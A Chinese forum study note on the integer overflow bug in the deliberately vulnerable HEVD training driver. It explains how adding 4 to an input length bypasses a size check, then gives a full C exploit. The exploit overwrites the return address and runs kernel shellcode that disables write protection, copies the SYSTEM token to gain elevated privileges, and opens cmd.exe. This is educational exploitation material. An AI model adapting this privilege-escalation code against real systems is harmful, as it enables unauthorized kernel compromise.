> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-270192.htm)

> [原创]HEVD 学习笔记 ------ 整数溢出漏洞

一. 前言  

========

实验环境与 HEVD 的介绍请看:[HEVD 学习笔记 ------ 概述](https://bbs.pediy.com/thread-270159.htm)。

二. 漏洞原理
=======

整数有有符号整数与符号整数。有符号整数将最高位作为符号位，如果最高位是 1 则该数为负数，如果最高位为 0，则该数为正数。而对于无符号数来说，它没有符号位，最高位也用来做运算，所以它只有正数且整数范围比有符号数要大的多。在 C 语言中，这些类型和取值范围如下

<table border="1"><tbody><tr><td valign="top"><strong>类型</strong></td><td valign="top"><strong>占用字节数</strong></td><td valign="top"><strong>取值范围</strong></td></tr><tr><td valign="top">int</td><td valign="top">4</td><td valign="top">-2147483648~2147483647</td></tr><tr><td valign="top">short int</td><td valign="top">2</td><td valign="top">-32768~32767</td></tr><tr><td valign="top">long int</td><td valign="top">4</td><td valign="top">-2147483648~2147483647</td></tr><tr><td valign="top">unsigned int</td><td valign="top">4</td><td valign="top">0~4294967295</td></tr><tr><td valign="top">unsigned short int</td><td valign="top">2</td><td valign="top">0~65535</td></tr><tr><td valign="top">unsigned long int</td><td valign="top">4</td><td valign="top">0~4294967295</td></tr></tbody></table>

但是，对于计算机而言对于有符号数与无符号数并没有区别，比如 - 1 对应的 4294967295 对应的都是 0xFFFFFFFF，只是在对这两个数据具体操作的时候，编译器会根据不同的数据类型生成不同的代码而已。

比如下面这段代码，将无符号整数赋值为 - 1，此时 x 中保存的就是 0xFFFFFFFF。如果将它当作无符号数，那么就是最大的整数 4294967295

```
#include  #include  int main()
{
    unsigned int x = -1;
    char szData1[0x100] = { 0 };
    char szData2[0x1000] = { 0 };
 
    memset(szData2, 'A', 0x1000);
    printf("x=%u\n", x);
 
    if (x > 10)
    {
        printf("x > 10\n");
        strcpy(szData1, szData2);
    }
 
    return 0;
} 
```

可以看到 x>10 输出了，strcpy 也成功执行导致了缓冲区的溢出。

![](https://bbs.pediy.com/upload/attach/202111/835440_VFBNFPWGF3FRVXU.jpg)

另外一种就是整数溢出的问题，比如下面的代码，x 首先赋值成了最大的整数，也就是 0xFFFFFFFF。此时，如果对 x 在进行加法操作，那么就会导致 x 的溢出，将高于 32 位的比特全部舍弃

```
#include  #include  int main()
{
    unsigned int x = 0xFFFFFFFF;
 
    printf("x=%u\n", x);
 
    x += 5;
 
    printf("x=%u\n", x);
 
    return 0;
} 
```

可以看到，发生溢出以后，x 的值变为了 4。

![](https://bbs.pediy.com/upload/attach/202111/835440_FZVPNGUV5HW2DK6.jpg)

所以，对于整数的使用不当，完全可能造成意料之外的后果，这就会产生漏洞。  

三. 漏洞分析  

==========

在 HEVD 中，产生整数溢出漏洞的函数地址存在函数地址表中的第 10 个，也就是说 IOCTRL 为 0x222003 + 9 * 4。

```
PAGE:004441EE loc_4441EE:                             ; CODE XREF: DispatchIoCtrl+34↑j
PAGE:004441EE                                         ; DATA XREF: PAGE:Func_Table↓o
PAGE:004441EE                 mov     esi, ds:DbgPrintEx ; jumptable 00444098 case 2236455
PAGE:004441F4                 push    offset aHevdIoctlInteg ; "****** HEVD_IOCTL_INTEGER_OVERFLOW ****"...
PAGE:004441F9                 push    3               ; Level
PAGE:004441FB                 push    4Dh             ; ComponentId
PAGE:004441FD                 call    esi ; DbgPrintEx
PAGE:004441FF                 add     esp, 0Ch
PAGE:00444202                 push    ebx             ; 将CurrentStackLocation指针入栈
PAGE:00444203                 push    edi             ; 将IRP的指针入栈
PAGE:00444204                 call    InterOverflowIoctlHandler
PAGE:00444209                 push    offset aHevdIoctlInteg ; "****** HEVD_IOCTL_INTEGER_OVERFLOW ****"...
PAGE:0044420E                 jmp     loc_4440BF

```

程序将 IRP 和 CurrentStackLocation 的指针入栈以后调用 InterOverflowIoctlHandler，继续跟进这个函数  

```
PAGE:004455F6 InterOverflowIoctlHandler proc near     ; CODE XREF: DispatchIoCtrl+1A0↑p
PAGE:004455F6
PAGE:004455F6 arg_CurrentStackLocation= dword ptr  0Ch
PAGE:004455F6
PAGE:004455F6                 push    ebp
PAGE:004455F7                 mov     ebp, esp
PAGE:004455F9                 mov     eax, [ebp+arg_CurrentStackLocation]
PAGE:004455FC                 mov     ecx, STATUS_UNSUCCESSFUL
PAGE:00445601                 mov     edx, [eax+IO_STACK_LOCATION.Parameters.DeviceIoControl.Type3InputBuffer]
PAGE:00445604                 mov     eax, [eax+IO_STACK_LOCATION.Parameters.DeviceIoControl.InputBufferLength]
PAGE:00445607                 test    edx, edx
PAGE:00445609                 jz      short loc_445614
PAGE:0044560B                 push    eax             ; int
PAGE:0044560C                 push    edx             ; void *
PAGE:0044560D                 call    TriggerIntegerOverflow
PAGE:00445612                 mov     ecx, eax
PAGE:00445614
PAGE:00445614 loc_445614:                             ; CODE XREF: InterOverflowIoctlHandler+13↑j
PAGE:00445614                 mov     eax, ecx
PAGE:00445616                 pop     ebp
PAGE:00445617                 retn    8
PAGE:00445617 InterOverflowIoctlHandler endp

```

函数将输入缓冲区和输入缓冲区长度入栈以后，调用 TriggerIntegerOverflow，继续跟进这个函数  

```
PAGE:0044561A ; int __stdcall TriggerIntegerOverflow(void *, int)
PAGE:0044561A TriggerIntegerOverflow proc near        ; CODE XREF: InterOverflowIoctlHandler+17↑p
PAGE:0044561A
PAGE:0044561A Dst             = dword ptr -820h
PAGE:0044561A var_20          = dword ptr -20h
PAGE:0044561A var_1C          = dword ptr -1Ch
PAGE:0044561A ms_exc          = CPPEH_RECORD ptr -18h
PAGE:0044561A arg_InputBuffer = dword ptr  8
PAGE:0044561A arg_InputSize   = dword ptr  0Ch
PAGE:0044561A
PAGE:0044561A                 push    810h
PAGE:0044561F                 push    offset stru_402460
PAGE:00445624                 call    __SEH_prolog4
PAGE:00445629                 xor     esi, esi        ; 将esi清0
PAGE:0044562B                 mov     ebx, esi
PAGE:0044562D                 mov     edi, 800h       ; 将edi赋值为0x800
PAGE:00445632                 push    edi             ; Size
PAGE:00445633                 push    esi             ; Val
PAGE:00445634                 lea     eax, [ebp+Dst]
PAGE:0044563A                 push    eax             ; Dst
PAGE:0044563B                 call    memset
PAGE:00445640                 add     esp, 0Ch
PAGE:00445643                 mov     [ebp-4], esi
PAGE:00445646                 push    1               ; Alignment
PAGE:00445648                 push    edi             ; Length
PAGE:00445649                 mov     edi, [ebp+arg_InputBuffer] ; 将输入缓冲区地址赋给edi
PAGE:0044564C                 push    edi             ; Address
PAGE:0044564D                 call    ds:ProbeForRead

```

函数首先将局部变量 Dst 初始化为 0，随后对输入缓冲区进行可读的检查。  

```
PAGE:004456B4                 mov     ecx, [ebp+arg_InputSize] ; 取出输入缓冲区长度赋给ecx
PAGE:004456B7                 lea     eax, [ecx+4]    ; 将长度+4的值赋给eax
PAGE:004456BA                 cmp     eax, 800h       ; eax是否小于等于0x800
PAGE:004456BF                 jbe     short loc_4456E2 ; 小于等于则跳转
PAGE:004456C1                 push    ecx
PAGE:004456C2                 push    offset aInvalidUserbuf ; "[-] Invalid UserBuffer Size: 0x%X\n"
PAGE:004456C7                 push    3               ; Level
PAGE:004456C9                 push    4Dh             ; ComponentId
PAGE:004456CB                 call    ds:DbgPrintEx
PAGE:004456D1                 add     esp, 10h
PAGE:004456D4                 mov     dword ptr [ebp-4], 0FFFFFFFEh
PAGE:004456DB                 mov     eax, STATUS_INVALID_BUFFER_SIZE
PAGE:004456E0                 jmp     short loc_445737

```

随后，函数会判断输入缓冲区的长度 + 4 是否小于等于 0x800，如果是的话则跳转到 loc_4456E2，否则函数返回 STATUS_INVALID_BUFFER_SIZE。要注意，此时的输入缓冲区的长度做了加法运算，那也就是说，如果输入缓冲区的长度是 0xFFFFFFFC~0xFFFFFFFF，那么经过 + 4 以后，就会产生溢出。

接着看，地址 loc_4456E2。  

```
PAGE:004456E2 loc_4456E2:                             ; CODE XREF: TriggerIntegerOverflow+A5↑j
PAGE:004456E2                                         ; TriggerIntegerOverflow+EB↓j
PAGE:004456E2                 mov     eax, ecx        ; 将输入缓冲区长度赋给eax
PAGE:004456E4                 shr     eax, 2          ; 将eax除以4
PAGE:004456E7                 cmp     esi, eax        ; 判断esi是否大于等于eax
PAGE:004456E9                 jnb     short loc_44572E ; 是的话，函数执行结束
PAGE:004456EB                 mov     eax, [edi]      ; 取出edi所保存的地址中的值
PAGE:004456ED                 cmp     eax, 0BAD0B0B0h ; 判断eax是否等于0x0BAD0B0B0
PAGE:004456F2                 jz      short loc_44572E ; 等于则跳转到函数执行结束
PAGE:004456F4                 mov     [ebp+esi*4+Dst], eax ; 将eax赋值到局部变量Dst的偏移处
PAGE:004456FB                 add     edi, 4          ; edi加4
PAGE:004456FE                 mov     [ebp+arg_InputBuffer], edi
PAGE:00445701                 inc     esi             ; esi加1
PAGE:00445702                 mov     [ebp+var_Count], esi
PAGE:00445705                 jmp     short loc_4456E2

```

注意刚开始运行这段代码的时候，esi 为 0，edi 为输入缓冲区的地址，所以这段代码做的就是将输入缓冲区的内容复制到局部变量 Dst 中，每次复制 4 个字节大小的内容，如果遇到的整型数据是 0x0BAD0B0B0 的话，也会退出函数。

由上可以知道出：

函数会对输入缓冲区的长度进行加 4 操作，接着判断加 4 以后的值，是否小于 0x800，如果是，那么程序就会继续执行将输入缓冲区中的内容赋值到局部变量中，直到输入缓冲区的内容被全部复制完或者遇到了 0x0BAD0B0B0。

此时，通过构造输入缓冲区的长度为 0xFFFFFFFC~0xFFFFFFFF 中的一个，经过 + 4 的操作以后，就会发生整数溢出，这就绕过了小于 0x800 的检查。此时，可以构造足够多的输入数据，让程序发生栈溢出漏洞。

四. 漏洞利用
=======

由上可知，可以通过整数溢出漏洞让程序发生栈溢出漏洞。在 IDA 中，可以看到局部变量 Dst 的偏移是 0x820，也就是说只要构造 0x824 的垃圾数据就可以覆盖掉局部变量和原 EBP 的数据，接着就可以覆盖掉 EIP，而为了让赋值操作停下，就需要在结尾加入标志 0x0BAD0B0B0。  

![](https://bbs.pediy.com/upload/attach/202111/835440_DEMAFZPT6NR58BZ.jpg)

完整的 EXP 代码如下:

```
// exploit.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#include  #include  #include  #include "ntapi.h"
#pragma comment(linker, "/defaultlib:ntdll.lib")
 
#define LINK_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define INPUT_BUFFER_LENGTH 0xFFFFFFFF    // 给足够的输入缓冲区的长度以发生溢出绕过检查
 
void ShowError(PCHAR msg, DWORD ErrorCode);
VOID Ring0ShellCode();
 
BOOL g_bIsExecute = FALSE;
 
int main()
{
    NTSTATUS status = STATUS_SUCCESS;
    HANDLE hDevice = NULL;
    DWORD dwReturnLength = 0;
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    CONST DWORD dwIoCtl = 0x222003 + 9 * 4;
 
    // 打开驱动设备
    hDevice = CreateFile(LINK_NAME,
                         GENERIC_READ | GENERIC_WRITE,
                         0,
                         NULL,
                         OPEN_EXISTING,
                         FILE_ATTRIBUTE_NORMAL,
                         0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        ShowError("CreateFile", GetLastError());
        goto exit;
    }
 
    CHAR szInput[0x82C] = { 0 };
 
    // 覆盖0x820的局部变量和0x4的ESP
    memset(szInput, 'A', 0x824);
    // 覆盖eip
    *(PDWORD)(szInput + 0x824) = (DWORD)Ring0ShellCode;
    // 停止复制的标志
    *(PDWORD)(szInput + 0x828) = 0x0BAD0B0B0;
    // 与驱动设备进行交互，分配0x58大小的内存
    if (!DeviceIoControl(hDevice,
                         dwIoCtl,
                         szInput,
                         INPUT_BUFFER_LENGTH,
                         NULL,
                         0,
                         &dwReturnLength,
                         NULL))
    {
        ShowError("DeviceIoControl", GetLastError());
        goto exit;
    }
 
    if (g_bIsExecute)
    {
        printf("Ring0 代码执行完成\n");
        si.cb = sizeof(si);
        if (!CreateProcess(TEXT("C:\\Windows\\System32\\cmd.exe"),
                           NULL,
                           NULL,
                           NULL,
                           FALSE,
                           CREATE_NEW_CONSOLE,
                           NULL,
                           NULL,
                           &si,
                           &pi))
        {
            printf("CreateProcess Error\n");
            goto exit;
        }
    }
exit:
    if (hDevice) NtClose(hDevice);
    system("pause");
 
    return 0;
}
 
void ShowError(PCHAR msg, DWORD ErrorCode)
{
    printf("%s Error 0x%X\n", msg, ErrorCode);
}
 
VOID __declspec(naked) Ring0ShellCode()
{
    __asm
    {
        pushfd
        pushad
        sub esp, 0x40
    }
 
    // 关闭页保护
    __asm
    {
        cli
        mov eax, cr0
        and eax, ~0x10000
        mov cr0, eax
    }
 
    __asm
    {
        // 取当前线程
        mov eax, fs:[0x124]
        // 取线程对应的EPROCESS
        mov esi, [eax + 0x150]
        mov eax, esi
    searchWin7:
        mov eax, [eax + 0xB8]
        sub eax, 0x0B8
        mov edx, [eax + 0xB4]
        cmp edx, 0x4
        jne searchWin7
        mov eax, [eax + 0xF8]
        mov [esi + 0xF8], eax
    }
 
    // 开起页保护
    __asm
    {
        mov eax, cr0
        or eax, 0x10000
        mov cr0, eax
        sti
    }
 
    g_bIsExecute = TRUE;
 
    __asm
    {
        add esp, 0x40
        popad
        popfd
 
        xor eax, eax
        pop ebp
        ret 8
    }
} 
```

运行 EXP 以后，将会成功提权

![](https://bbs.pediy.com/upload/attach/202111/835440_BZW54FJ83Q85R3W.jpg)

五. 参考资料  

==========

> 1.  《漏洞战争》
>     
> 2.  [从汇编的角度学习 C/C++ 之基本数据类型](https://bbs.pediy.com/thread-269525.htm)
>     
> 3.  [HEVD 学习笔记 ------ 缓冲区溢出攻击](https://bbs.pediy.com/thread-270172.htm)  
>     

[【公告】【iPhone 13 大奖等你拿】看雪. 众安 2021 KCTF 秋季赛 防守篇 - 征题倒计时（11 月 14 日截止）！](https://bbs.pediy.com/thread-269228.htm)

[#漏洞分析](forum-150-1-153.htm) [#漏洞利用](forum-150-1-154.htm) [#Windows](forum-150-1-160.htm)